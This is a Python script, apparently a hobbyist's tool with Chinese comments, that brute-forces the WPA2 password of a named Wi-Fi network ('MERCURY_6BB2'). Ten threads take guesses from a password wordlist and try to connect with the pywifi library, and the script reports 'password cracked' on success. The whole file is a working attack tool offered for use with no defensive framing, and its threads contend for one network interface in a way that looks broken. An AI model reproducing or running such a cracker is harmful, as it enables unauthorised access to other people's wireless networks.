# @Author  : ShiRui
import pywifi
import time
import threading
from pywifi import const
import queue


class Wifi:

	def product(self):    # 创建生产者

		while True:

			password = file.readline()  # 将密码本中的密码读入
			q.put(password)     # 把密码放到queue队列中。

	def consumerPassword(self):  # 创建消费者

		while True:

			password = q.get()  # 取密码
			Flage = self.wifiConnect(password)  # 调用函数，并返回值

			if Flage:
				print("密码破解成功", password)  # 判断返回值
				break

			else:
				print("密码不正确", password)

	def wifiConnect(self, password):  # 创建WiFi连接函数

			wifi = pywifi.PyWiFi()  # 创建一个WiFi对象
			ifaces = wifi.interfaces()[0]  # 获得wifi接口
			ifaces.disconnect()  # 如果现在wifi连接，就断开
			time.sleep(1)  # wifi断开还是需要时间，所以设置一个睡眠时间
			wifi_status = ifaces.status()  # 获取当前状态码
			if wifi_status == const.IFACE_DISCONNECTED:  # 判断时候wifi已经连接，可以看const源码，里面每个状态对应的状态码

				print("wifi没有连接")
				profile = pywifi.Profile()  # 重新配置profile文件。
				profile.ssid = 'MERCURY_6BB2'  # 设置要连接的WiFi名字
				profile.auth = const.AUTH_ALG_OPEN  # 将网卡处于打开状态
				profile.akm.append(const.AKM_TYPE_WPA2PSK)  # 家用wifi一般的加密方式，加入新配置的profile文件中。
				profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元
				profile.key = password  # 将密码表中的密码配置进去
				ifaces.remove_all_network_profiles()  # 删除所有已经配置的WiFi文件

				new_profile = ifaces.add_network_profile(profile)  # 新增wifi配置文件

				ifaces.connect(new_profile)  # 网卡连接wifi
				time.sleep(4)  # 因为连接也是需要时间的，所以我们在这里设置一个睡眠时间

				if ifaces.status() == const.IFACE_CONNECTED:  # 判断连接的状态

					return True

				else:

					return False

			else:
				print("已经连接wifi！")


if __name__ == "__main__":

	file = open('password.txt')  # 打开创建好的密码本
	q = queue.Queue(maxsize=1000)  # 将队列queue实例化，最大缓存值设置为1000（保险起见）虽然queue是安全的队列
	thread = []  # 容纳线程的列表

	wifi = Wifi()  # 实例化对象

	p = threading.Thread(target=wifi.product)  # 创建线程
	p.start()  # 运行线程

	for i in range(10):  # 创建多个线程

		c = threading.Thread(target=wifi.consumerPassword)
		thread.append(c)

	for t in thread:  # 运行多个线程

		t.start()
